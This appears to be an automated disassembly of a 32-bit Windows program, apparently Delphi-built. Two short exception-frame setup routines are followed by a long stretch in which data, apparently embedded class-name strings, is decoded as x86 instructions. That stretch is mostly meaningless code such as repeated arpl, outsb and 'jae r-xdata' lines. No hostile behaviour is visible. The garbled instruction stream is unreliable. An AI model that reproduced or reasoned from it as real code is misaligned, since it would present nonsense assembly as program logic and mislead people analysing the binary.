sub_485494
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_4039a8#6
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4854c0
retn
sub_4854cc
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_4039a8#5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4854f8
retn
sub_48557d
mov eax [ 0xffffffffd3d37432 ]
adc [ ebp + 0x4500021 ] ecx
add [ ebx + 0x634108fb ] 0x63
jae r-xdata
add al 0x42
add [ esp + eax ] ch
inc edx
add [ esp + ebp * 4 ] dl
inc edi
add [ eax + 0x20004871 ] ch
jno r-xdata
pop eax
push eax
int1
add bh bh
jmp esp
jo r-xdata
add [ edx + ebp * 4 + 0x47 ] bl
add [ eax - 0x56 ] bl
inc edi
add [ ecx + esi * 2 ] ch
dec eax
add [ ecx + esi * 2 + 0xe0048 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add al 0x55
dec eax
add [ eax ] dl
add [ eax ] al
adc dl [ ecx + eax * 2 + 0x63 ]
arpl [ ebp + 0x73 ] sp
jae r-xdata
push esi
dec eax
imul esp [ ebx + 0x61 ] 0x6e6f6974
in al 0x55
dec eax
add [ eax - 0x5a ] al
inc edi
add [ 0x63410800 ] al
arpl [ ebp + 0x73 ] sp
jae r-xdata
or [ edi ] dl
jo r-xdata
insd
inc esi
outsd
jb r-xdata
push esp
inc ecx
arpl [ ebx + 0x65 ] sp
jae r-xdata
push esp
inc ecx
arpl [ ebx + 0x65 ] sp
jae r-xdata
push eax
add [ eax ] al
lea eax [ eax ]
test [ esi + 0x48 ] dl
add [ eax ] cl
pop ss
outsb
arpl [ ebp + 0x6c ] sp
or [ ebx + 0x6d ] dl
popad
insb
insb
imul ebp [ esi + 0x74 ] 0x40119400
inc esi
outsd
jb r-xdata
add [ eax ] cl
pop ss
arpl [ ebp + 0x6c ] sp
or [ ebx + 0x6d ] dl
popad
insb
insb
imul ebp [ esi + 0x74 ] 0x40119400
add [ eax + edx ] bh
inc eax
add [ ebx + 0x4856d0c0 ] cl
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
lea eax [ eax ]
push esp
push esi
dec eax
add [ edi ] al
adc dl [ ecx + eax * 2 + 0x63 ]
arpl [ ebp + 0x73 ] sp
jae r-xdata
insb
imul ebp [ esi + 0x74 ] 0x40119400
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp + 0x57c80040 ] cl
dec eax
add [ eax ] cl
sbb dl [ ecx + eax * 2 + 0x63 ]
arpl [ ebp + 0x73 ] sp
jae r-xdata
outsd
jb r-xdata
popad
or [ ebx + 0x6d ] dl
inc edx
outsw
jb r-xdata
insd
outsd
jb r-xdata
inc ebx
popad
inc edx
outsw
jb r-xdata
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
jo r-xdata
or [ edi ] cl
push esp
inc ecx
arpl [ ebx + 0x65 ] sp
outsd
jb r-xdata
inc esp
inc edx
outsw
jb r-xdata
insb
push ebp
jo r-xdata
jb r-xdata
inc esp
insb
inc ebx
outsd
outsb
imul si [ edx + 0x6d ] 0x300
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
insb
inc esp
insb
je r-xdata
and [ esi ] al
dec ecx
outsb
jae r-xdata
and [ esi ] al
inc ebx
popad
outsb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + 0x6 ] si
or [ edi ] dl
insb
xchg esp eax
adc [ eax ] eax
cmp al 0x10
inc esi
insb
inc ecx
je r-xdata
add [ esi ] eax
push ebx
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
popad
je r-xdata
jae r-xdata
insb
inc ebx
outsd
outsb
imul si [ edx + 0x6d ] 0x200
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
or [ ebx + 0x6d ] dl
popad
insb
insb
imul ebp [ esi + 0x74 ] 0x65520820
jae r-xdata
and [ esi ] al
inc ebx
popad
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + 0x6 ] si
add [ eax ] cl
andps xmm0 [ ecx + 0x63 ]
arpl [ ebp + 0x73 ] sp
jae r-xdata
outsd
outsb
jae r-xdata
outsb
arpl [ ebp + 0x6c ] sp
add [ edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
jb r-xdata
jae r-xdata
outsd
jb r-xdata
je r-xdata
dec edi
jo r-xdata
insd
outsd
jb r-xdata
or [ ebx + 0x6d ] dl
popad
insb
insb
imul ebp [ esi + 0x74 ] 0x40119400
add [ eax + edx ] bh
inc eax
add [ ebx + 0x48585cc0 ] cl
add [ eax ] cl
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
jb r-xdata
adc [ ecx + eax * 2 + 0x63 ] edx
arpl [ ebp + 0x73 ] sp
jae r-xdata
je r-xdata
insb
insb
imul ebp [ esi + 0x74 ] 0x40119400
add [ eax + edx ] bh
inc eax
add [ eax + 0x57 ] ah
dec eax
add [ eax ] cl
sbb edx [ ecx + eax * 2 + 0x63 ]
arpl [ ebp + 0x73 ] sp
jae r-xdata
add [ edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
insd
outsd
jb r-xdata
add [ ebp + 0x58180040 ] cl
dec eax
or [ ebx + 0x6d ] dl
popad
insb
and [ esi ] al
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + 0x6 ] si
add [ eax + edx ] bh
inc eax
add [ ebx + 0x48571cc0 ] cl
add [ eax ] cl
adc [ ecx + eax * 2 + 0x63 ] edx
arpl [ ebp + 0x73 ] sp
jae r-xdata
add [ edx ] al
outsb
insb
add [ gs : ecx ] eax
outsd
jb r-xdata
pop ecx
push es
push ebx
imul ebp [ esi + 0x67 ] 0x9400656c
adc [ eax ] eax
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx + 0x10ac0040 ] ch
inc eax
add [ eax + r-xdata ] dl
or [ esp + edx * 2 ] dl
push ebx
insd
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] 0x7080200
inc ecx
push ebx
outsb
jb r-xdata
inc eax
add [ eax + 0x8004858 ] ah
adc edx [ ecx + eax * 2 + 0x63 ]
arpl [ ebp + 0x73 ] sp
jae r-xdata
popad
insb
insb
imul ebp [ esi + 0x74 ] 0x40119400
add [ eax + edx ] bh
outsb
add [ edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
and [ esi ] al
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ ebx + 0x6d ] dl
popad
insb
insb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + 0x6 ] si
imul ebp [ esi + 0x74 ] 0x40119400
add [ eax + edx ] bh
inc eax
add [ ebx + 0x4858e8c0 ] cl
add [ eax ] cl
adc al 0x54
inc ecx
arpl [ ebx + 0x65 ] sp
jae r-xdata
push ebp
outsb
insb
outsd
popad
add [ fs : edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
jae r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + 0x6 ] si
and [ esi ] al
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ ebx + 0x6d ] dl
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + 0x6 ] si
arpl [ ebx + 0x65 ] sp
jae r-xdata
inc esi
outsd
jb r-xdata
inc ecx
push esp
dec ebp
outsd
jne r-xdata
and [ esi ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + 0x6 ] si
arpl [ ebx + 0x65 ] sp
jae r-xdata
inc esi
add [ ecx + edx + 0x103c0040 ] dl
inc eax
push ebx
insd
popad
insb
insb
imul ebp [ esi + 0x74 ] 0x40119400
add [ eax + edx ] bh
arpl [ ebx + 0x65 ] sp
jae r-xdata
inc esi
outsd
jb r-xdata
push esp
dec ebp
outsd
jne r-xdata
insd
inc esp
outsd
ja r-xdata
pop es
inc esi
push esp
inc ecx
dec ebp
outsd
jne r-xdata
insd
dec ebp
outsd
jbe r-xdata
add [ 0x53410708 ] al
outsb
jb r-xdata
dec ebx
jns r-xdata
jae r-xdata
jb r-xdata
dec ebx
jns r-xdata
insd
push ebp
jo r-xdata
inc ecx
add [ 0x53410708 ] al
outsb
jb r-xdata
add [ esi ] eax
inc edx
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
inc ecx
push ebx
outsb
jb r-xdata
outsd
or [ gs : ebx + 0x6d ] dl
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
imul ebp [ ecx + 0x8 ] 0x6c616d53
insb
imul ebp [ esi + 0x74 ] 0x40119400
add [ eax + edx ] bh
inc eax
add ah dh
pop edx
dec eax
add [ eax ] cl
adc [ ecx + eax * 2 + 0x63 ] dl
arpl [ ebp + 0x73 ] sp
dec ebx
jns r-xdata
add [ eax ] ecx
push esp
dec edi
bound ebp [ edx + 0x65 ]
add [ ebx + 0x485aacc0 ] cl
add [ eax ] cl
adc edx [ ecx + eax * 2 + 0x63 ]
arpl [ ebp + 0x73 ] sp
jae r-xdata
outsd
ja r-xdata
add eax 0x53410708
outsb
jb r-xdata
add [ esi ] eax
inc edx
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
push es
je r-xdata
add [ edi ] eax
inc esp
popad
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x7 ] si
adc [ eax ] al
cmp al 0x10
outsd
jb r-xdata
inc eax
add [ ebx + ebx * 2 + 0x48 ] cl
add [ eax ] cl
adc [ ecx + eax * 2 + 0x63 ] dl
arpl [ ebp + 0x73 ] sp
jae r-xdata
cmp al 0x10
outsd
jb r-xdata
jae r-xdata
outsd
jb r-xdata
arpl [ ecx + eax + 0x8 ] si
add [ ebx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
add [ esi ] eax
inc edx
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
jne r-xdata
je r-xdata
arpl [ ecx + eax + 0x6 ] si
popad
insb
insb
imul ebp [ esi + 0x74 ] 0x68530501
imul esp [ esi + 0x74 ] 0x616d5308
insb
insb
imul ebp [ esi + 0x74 ] 0x6580101
push ebx
imul ebp [ esi + 0x67 ] 0x101656c
outsb
or [ ebx + 0x6d ] dl
insd
inc ebp
jb r-xdata
inc ecx
push ebx
outsb
jb r-xdata
inc esi
outsd
jb r-xdata
popad
insb
insb
imul ebp [ esi + 0x74 ] 0x69460a01
insb
je r-xdata
pop es
inc ebp
arpl [ gs : ecx + eax + 0x7 ] si
dec ebx
jns r-xdata
insb
insb
imul ebp [ esi + 0x74 ] 0x68530501
imul esp [ esi + 0x74 ] 0x616d5308
dec ebx
jns r-xdata
add [ edi ] eax
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
pop es
je r-xdata
outsb
or [ ebx + 0x6d ] dl
popad
insb
insb
imul ebp [ esi + 0x74 ] 0x68530501
imul esp [ esi + 0x74 ] 0x616d5308
insb
insb
imul ebp [ esi + 0x74 ] 0x6580101
push ebx
imul ebp [ esi + 0x67 ] 0x101656c
pop ecx
push es
push ebx
imul ebp [ esi + 0x67 ] 0x9400656c
adc [ eax ] eax
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx + 0x10ac0040 ] ch
inc eax
add [ eax + r-xdata ] dl
or [ edx ] dl
push esp
jb r-xdata
push ebx
insd
or [ ebx + 0x6d ] dl
popad
insb
insb
imul ebp [ esi + 0x74 ] 0x65520820
jae r-xdata
and [ esi ] al
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ ebx + 0x6d ] dl
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + 0x6 ] si
or [ edi ] al
inc esi
imul ebp [ esp + esi * 2 + 0x65 ] 0x8030072
pop es
inc ecx
push ebx
outsb
jb r-xdata
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ ebx + 0x6d ] dl
and [ esi ] al
outsd
jb r-xdata
jb r-xdata
jo r-xdata
outsb
jb r-xdata
jae r-xdata
outsd
or [ gs : ebx + 0x6d ] dl
popad
insb
insb
imul ebp [ esi + 0x74 ] 0x68530501
imul esp [ esi + 0x74 ] 0x616d5308
insb
insb
imul ebp [ esi + 0x74 ] 0x40119400
add [ eax + edx ] bh
arpl [ ecx + eax + 0x7 ] si
outsb
or [ ebx + 0x6d ] dl
popad
insb
insb
imul ebp [ esi + 0x74 ] 0x68530501
imul esp [ esi + 0x74 ] 0x616d5308
insb
insb
imul ebp [ esi + 0x74 ] 0x6580101
push ebx
imul ebp [ esi + 0x67 ] 0x101656c
pop ecx
push es
push ebx
imul ebp [ esi + 0x67 ] 0x9400656c
adc [ eax ] eax
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx + 0x10ac0040 ] ch
inc eax
add [ ebp + 0x5a500040 ] cl
dec eax
add [ eax ] cl
adc dl [ ecx + eax * 2 + 0x63 ]
arpl [ ebp + 0x73 ] sp
jae r-xdata
outsb
outsd
add [ edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
or [ gs : ebx + 0x6d ] dl
popad
insb
insb
imul ebp [ esi + 0x74 ] 0x40119400
add [ eax + edx ] bh
popad
insb
insb
imul ebp [ esi + 0x74 ] 0x70410901
jo r-xdata
push ebx
insd
jns r-xdata
outsb
jb r-xdata
inc esi
outsd
jb r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp + 0x5c080040 ] cl
dec eax
add [ eax ] cl
push ss
push esp
inc ecx
arpl [ ebx + 0x65 ] sp
jae r-xdata
cmp al 0x10
outsd
outsb
jae r-xdata
jae r-xdata
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + 0x6 ] si
add ecx [ eax ]
pop es
jb r-xdata
add ecx [ eax ]
pop es
inc ecx
push ebx
outsb
add [ edi ] eax
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x7 ] si
popad
insd
jae r-xdata
add cl [ eax ]
pop es
inc eax
add [ eax + edx ] bh
inc eax
outsd
jb r-xdata
and [ esi ] al
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ ebx + 0x6d ] dl
popad
insb
insb
imul ebp [ esi + 0x74 ] 0x40119400
add [ eax + edx ] bh
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + 0x6 ] si
insd
outsd
jb r-xdata
inc eax
add [ eax + edx ] bh
adc [ eax ] eax
cmp al 0x10
popad
insb
insb
imul ebp [ esi + 0x74 ] 0x40119400
add [ eax + edx ] bh
or [ gs : ebx + 0x6d ] dl
and [ esi ] al
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ ebx + 0x6d ] dl
popad
insb
insb
imul ebp [ esi + 0x74 ] 0x40119400
add [ eax + edx ] bh
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + 0x6 ] si
inc ecx
push ebx
inc ecx
jo r-xdata
outsb
je r-xdata
inc eax
add [ eax + r-xdata ] dl
or [ ecx ] dl
push esp
inc ecx
arpl [ ebx + 0x65 ] sp
jae r-xdata
or [ ebx + 0x6d ] dl
popad
insb
insb
imul ebp [ esi + 0x74 ] 0x40119400
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
imul ebp [ esi + 0x74 ] 0x40119400
add [ eax + edx ] bh
inc eax
add [ ebx * 2 + 0x19080048 ] bh
push esp
inc ecx
arpl [ ebx + 0x65 ] sp
jae r-xdata
inc esi
outsd
jb r-xdata
outsb
je r-xdata
jns r-xdata
insb
insb
imul ebp [ esi + 0x74 ] 0x40119400
insd
popad
inc ecx
push ebx
outsb
jb r-xdata
add [ edx ] al
or [ edi ] al
insb
inc esi
outsd
jb r-xdata
inc eax
add [ ebx + 0x485cf4c0 ] cl
add [ eax ] cl
adc eax 0x63634154
jae r-xdata
xchg esp eax
adc [ eax ] eax
cmp al 0x10
inc esp
imul esi [ edx + 0x74 ] 0x8020079
pop es
jb r-xdata
insb
jns r-xdata
xchg esp eax
adc [ eax ] eax
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ ebx + 0x6d ] dl
popad
insb
insb
imul ebp [ esi + 0x74 ] 0x40119400
add [ eax + edx ] bh
inc eax
add [ eax + r-xdata ] dl
or [ ecx ] ah
push esp
inc ecx
inc esi
outsd
jb r-xdata
insb
insb
push ebp
inc eax
add [ eax + r-xdata ] dl
or [ edi ] cl
push esp
inc ecx
arpl [ ebx + 0x65 ] sp
jae r-xdata
xchg esp eax
adc [ eax ] eax
cmp al 0x10
arpl [ ebx + 0x65 ] sp
jae r-xdata
outsd
jb r-xdata
or [ ebx + 0x6d ] dl
outsb
arpl [ ebp + 0x6c ] sp
push edx
arpl [ gs : edi + 0x72 ] bp
inc ebp
js r-xdata
inc eax
add [ ebp + 0x5c6c0040 ] cl
dec eax
add [ eax ] cl
adc [ ecx + eax * 2 + 0x63 ] dl
arpl [ ebp + 0x73 ] sp
jae r-xdata
cmp al 0x10
imul ebp [ esp + esi * 2 + 0x65 ] 0x8030072
pop es
insd
inc esi
outsd
jb r-xdata
push es
inc edx
imul ebp [ gs : bp + 0x42 ] 0x68637461
inc ebp
imul esi [ fs : eax + eax + 0x2 ] 0x53410708
outsb
jb r-xdata
pop es
push ebp
outsb
outsd
inc edx
popad
je r-xdata
popad
insb
insb
imul ebp [ esi + 0x74 ] 0x40119400
add [ eax + edx ] bh
inc eax
add [ eax + 0x800485d ] cl
sbb [ ecx + eax * 2 + 0x63 ] dl
arpl [ ebp + 0x73 ] sp
jae r-xdata
push ebx
insd
je r-xdata
jb r-xdata
jb r-xdata
outsd
jb r-xdata
inc edx
outsw
jb r-xdata
and [ esi ] al
inc ebx
popad
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + 0x6 ] si
je r-xdata
inc esi
jb r-xdata
push 0x74696445
add [ edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
add cl [ eax ]
pop es
inc ecx
push ebx
outsb
jb r-xdata
inc ecx
je r-xdata
outsb
jae r-xdata
lea eax [ eax ]
mov al [ 0x800485e ]
imul ebp [ gs : bp + 0x54 ] 0x736e6172
popad
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
popad
inc ecx
je r-xdata
jae r-xdata
inc edx
imul ebp [ gs : bp + 0x54 ] 0x736e6172
popad
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ ebx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
outsb
jae r-xdata
outsb
add [ ebx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
outsd
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ ebx + 0x6d ] dl
popad
insb
insb
imul ebp [ esi + 0x74 ] 0x6f430a09
outsb
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
or al [ ebx + 0x6f ]
outsb
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add [ ecx + edx + 0x103c0040 ] dl
inc eax
add [ eax ] bl
lodsd [ esi ]
inc edi
add [ eax + r-xdata ] dl
or [ eax ] ah
push esp
inc ecx
arpl [ ebx + 0x65 ] sp
jae r-xdata
and [ esi ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + 0x6 ] si
inc ebx
and [ esi ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + 0x6 ] si
and [ esi ] al
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ ebx + 0x6d ] dl
popad
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + 0x6 ] si
popad
jb r-xdata
jb r-xdata
arpl [ ecx + ebp * 2 + 0x6f ] si
je r-xdata
outsd
jb r-xdata
and dl [ ecx + eax * 2 + 0x63 ]
arpl [ ebp + 0x73 ] sp
jae r-xdata
or [ edx ] ecx
inc ebx
outsd
outsb
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
or al [ ebx + 0x6f ]
outsb
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add [ ecx + edx - 0x52e7ffc0 ] dl
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
and [ esi ] al
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ ebx + 0x6d ] dl
popad
insb
insb
imul ebp [ esi + 0x74 ] 0x6f430a09
outsb
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + 0x6 ] si
inc edi
add [ ebp + 0x5ea00040 ] cl
dec eax
add [ eax ] cl
add [ eax ] bl
lodsd [ esi ]
inc ecx
push ebx
outsb
jb r-xdata
pop es
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
or [ edx ] ecx
inc ebx
outsd
outsb
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
or al [ ebx + 0x6f ]
outsb
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add [ ecx + edx - 0x52e7ffc0 ] dl
inc edi
add [ eax + r-xdata ] dl
or [ ebx ] bl
push esp
inc ecx
arpl [ ebx + 0x65 ] sp
jae r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
mov eax eax
insb
pop edi
dec eax
outsd
insd
insd
imul esi [ esp + edx * 2 + 0x72 ] 0x61736e61
add [ eax ] cl
push ds
push esp
inc ecx
arpl [ ebx + 0x65 ] sp
jae r-xdata
outsd
outsb
or al [ ebx + 0x6f ]
outsb
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add [ ecx + edx + 0x103c0040 ] dl
inc eax
add [ eax ] bl
lodsd [ esi ]
inc edi
add [ eax ] dl
pop edi
dec eax
add [ eax ] cl
and [ ecx + eax * 2 + 0x63 ] edx
arpl [ ebp + 0x73 ] sp
outsd
outsd
jb r-xdata
inc edx
outsw
jb r-xdata
inc edi
add [ ebx + 0x485f6cc0 ] cl
inc eax
add [ eax ] bl
lodsd [ esi ]
outsb
add [ ecx + edx - 0x52e7ffc0 ] dl
or [ edx ] ecx
inc ebx
outsd
outsb
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
or al [ ebx + 0x6f ]
outsb
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
pop es
inc esi
outsd
jb r-xdata
outsb
inc esi
outsd
jb r-xdata
outsb
add [ edx ] al
or [ edi ] al
outsd
jae r-xdata
inc ebx
outsd
insd
insd
imul esi [ esp + edx * 2 + 0x72 ] 0x61736e61
or al [ edi ]
popad
outsb
je r-xdata
jb r-xdata
jb r-xdata
push eax
imul esi [ esi + 0x6f ] 0x62615474
insb
inc ebx
push 0x65676e61
add [ edx ] al
or [ edi ] al
inc ecx
add [ esi ] al
push edx
popad
jae r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
push ebx
outsb
push edx
outsd
insb
insb
bound esp [ ecx + 0x63 ]
imul edx [ edx + esi * 2 + 0x61 ] 0x6e
jae r-xdata
jo r-xdata
outsd
jb r-xdata
imul esi [ ebx + 0x70 ] 0x68637461
add [ ecx + edx + 0x11300040 ] dl
inc eax
add ah ah
adc [ eax ] eax
nop
and [ eax + 0x48 ] 0x0
push es
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ ecx + 0x44 ] ecx
inc ebx
outsd
insd
insd
popad
outsb
or cl [ fs : edi + 0x6c ]
push esi
popad
jb r-xdata
adc [ edi ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x7 ] si
popad
je r-xdata
outsb
pop es
dec ecx
outsb
je r-xdata
arpl [ ecx + ebp * 2 + 0x6f ] si
nop
mov al [ 0x8004861 ]
je r-xdata
outsb
inc ebp
js r-xdata
inc ebx
outsd
insd
insd
popad
outsb
popad
bound ebp [ ebp + 0x64 ]
add [ ebx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
inc ebp
inc esi
outsd
jb r-xdata
jo r-xdata
or [ ecx ] bl
push esp
inc ecx
arpl [ ebx + 0x65 ] sp
jae r-xdata
push 0x40119400
add [ eax ] dh
adc [ eax ] eax
in al 0x11
inc eax
add [ eax + r-xdata ] dl
inc esp
jb r-xdata
dec edi
outsd
jb r-xdata
sbb dl [ ecx + eax * 2 + 0x63 ]
arpl [ ebp + 0x73 ] sp
jae r-xdata
add [ eax ] cl
push 0x40119400
add [ eax ] dh
adc [ eax ] eax
in al 0x11
inc eax
add [ ebx + 0x486150c0 ] cl
arpl [ gs : edx + ecx + 0xd ] si
arpl [ ebp + 0x74 ] si
add [ gs : edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
adc [ edi ] al
inc ebx
outsd
insd
insd
popad
outsb
or cl [ fs : edi + 0x6c ]
push esi
popad
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x7 ] si
outsb
inc ebp
inc ebx
add [ eax ] cl
sbb [ ecx + eax * 2 + 0x63 ] edx
arpl [ ebp + 0x73 ] sp
jae r-xdata
or [ ecx + 0x44 ] ecx
je r-xdata
xchg esp eax
adc [ eax ] eax
push esp
adc [ eax ] al
lea eax [ eax ]
adc al 0x60
dec eax
add [ eax ] cl
pop ds
push esp
inc ecx
arpl [ ebx + 0x65 ] sp
jae r-xdata
xchg esp eax
bound ecx [ eax ]
or [ esi ] dl
inc esi
jae r-xdata
inc edx
outsw
jb r-xdata
or [ edx ] bl
push esp
inc ecx
arpl [ ebx + 0x65 ] sp
jae r-xdata
outsd
jb r-xdata
push esp
inc ecx
arpl [ ebx + 0x65 ] sp
jae r-xdata
arpl [ gs : ecx + ecx + 0x49 ] si
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0x49 ] si
arpl [ ebp + 0x4f ] sp
adc [ edi ] al
inc ebx
outsd
insd
insd
popad
outsb
or cl [ fs : edi + 0x6c ]
push esi
popad
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x7 ] si
outsb
je r-xdata
popad
adc [ edi ] al
inc ebx
outsd
insd
insd
popad
outsb
or cl [ fs : edi + 0x6c ]
push esi
popad
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x7 ] si
jae r-xdata
sbb [ ecx + eax * 2 + 0x63 ] edx
arpl [ ebp + 0x73 ] sp
jae r-xdata
push 0x40119400
add [ eax ] dh
adc [ eax ] eax
in al 0x11
inc eax
add [ ebx + 0x4860e8c0 ] cl
add [ eax ] cl
insd
popad
outsb
inc esi
outsd
jb r-xdata
jb r-xdata
inc esi
outsd
jb r-xdata
inc eax
add [ edx + 0x16080048 ] dl
inc edx
outsw
jb r-xdata
arpl [ ebx + 0x65 ] sp
jae r-xdata
push ebx
arpl [ edx + 0x65 ] si
outsb
push esp
imul esi [ eax ] 0x41070803
push ebx
outsb
jb r-xdata
jae r-xdata
inc esi
push ebx
arpl [ edx + 0x65 ] si
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0xd ] si
inc ebx
outsd
insd
insd
popad
inc esp
imul esi [ ebx + 0x70 ] 0x68637461
add [ ecx + edx + 0x11e40040 ] dl
inc eax
add ah ah
adc [ eax ] eax
lea eax [ eax ]
adc al 0x62
dec eax
add [ eax ] cl
pop ss
push esp
inc ecx
popad
xchg esp eax
adc [ eax ] eax
xor [ ecx ] dl
inc eax
add [ eax + r-xdata ] dl
imul esi [ ebx + 0x70 ] 0x68637461
add [ ecx + edx + 0x11300040 ] dl
inc eax
add ah ah
adc [ eax ] eax
mov eax eax
push eax
popad
dec eax
inc esp
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
outsb
je r-xdata
popad
outsb
je r-xdata
popad
outsd
insd
inc ebx
outsd
insd
insd
popad
outsb
inc edx
outsw
jb r-xdata
arpl [ ebp + 0x73 ] sp
jae r-xdata
imul ebp [ esi + 0x61 ] 0x6e65526c
je r-xdata
inc ecx
je r-xdata
in al 0x11
push edx
outsb
jb r-xdata
outsb
push esp
imul esi [ eax + 0x54 ] 0x9747865
dec ecx
inc esp
imul esi [ ebx + 0x70 ] 0x68637461
or cl [ ebx + edx * 2 ]
outsd
jne r-xdata
or cl [ 0x65726353 ]
push esp
dec edi
inc esp
imul esi [ ebx + 0x70 ] 0x68637461
or al [ esi ]
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ ecx + 0x44 ] ecx
imul esi [ ebx + 0x70 ] 0x68637461
add [ ecx + edx + 0x11e40040 ] dl
inc eax
add ah ah
adc [ eax ] eax
dec ecx
outsd
jb r-xdata
imul esi [ ebx + 0x70 ] 0x68637461
add [ ecx + edx + 0x11300040 ] dl
inc eax
add ah ah
adc [ eax ] eax
mov eax eax
call 0x848a949
